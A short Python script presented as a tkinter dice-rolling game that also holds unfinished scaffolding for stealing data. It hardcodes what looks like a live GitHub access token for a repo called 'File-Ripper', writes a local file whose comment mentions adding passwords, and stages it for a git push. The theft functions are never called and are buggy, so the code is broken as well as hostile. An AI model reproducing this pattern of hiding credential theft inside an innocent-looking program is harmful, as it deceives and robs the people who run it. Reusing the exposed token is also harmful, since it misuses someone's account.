from tkinter import *
from tkinter import ttk
import random
import os,socket,subprocess,threading;
import subprocess
import os
import base64
import requests

#github config
ghUsername = "dirkwillemse"
ghToken = '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'
ghRepo ='File-Ripper'
ipFile = 'C:\storage.txt'
ghBranch = 'master'
ghTarger = 'rips/storage.txt'

def fileCreate():
    f = open('C:\storage.txt','x') # creates file
    with open("C:\storage.txt", "a") as f: # opens the file and appends to it 
     f.write("Now the file has more content!") # write to the file add pws

def filePush():
    subprocess.run(['git','add',ipFile],check=true)
    subprocess.run(['git commit'])


def roll():
    dice = random.randint(1,6)
    num_label['text'] = str(dice)

root = Tk()
frm = ttk.Frame(root, padding=100)
frm.grid()
ttk.Label(frm, text="Roll the dice").grid(column=0, row=0)
ttk.Button(frm, text="Roll", command=roll).grid(column=1, row=0)
ttk.Label(frm, text="Number:").grid(column=0,row=2)
num_label = ttk.Label(frm, text="")
num_label.grid(column=1,row=2)
root.mainloop()


